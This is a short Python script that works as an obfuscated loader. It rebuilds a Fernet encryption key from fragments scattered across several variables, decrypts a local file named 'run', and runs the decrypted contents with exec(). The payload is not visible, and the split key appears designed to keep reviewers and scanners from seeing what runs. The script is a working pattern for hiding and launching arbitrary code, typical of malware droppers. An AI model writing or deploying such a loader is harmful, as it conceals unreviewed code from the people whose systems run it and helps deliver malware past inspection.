import base64
from cryptography.fernet import Fernet as Fn

part1 = ''.join(['8', 'oB', 'v0', 'iU'])
part2 = ''.join(['c5', 'bi', 'Aq', 'zs1'])
part3 = ''.join(['y6', '3x', 'tx', 'YF'])
part4 = ''.join(['WC', 'zu', 'OQ', 'LP'])
part5 = ''.join(['pf', 'V0', 'zy', 'BW', 'osU='])

real_key = (part1 + part2 + part3 + part4 + part5).encode()

with open("run", "rb") as __in__:
    encrypted_data = __in__.read()
try:
    Fn(real_key).decrypt(encrypted_data)
    exec(Fn(real_key).decrypt(encrypted_data).decode(), {"__name__": "__main__"})
except Exception as e:
    print("[-] Error occurred:", e)
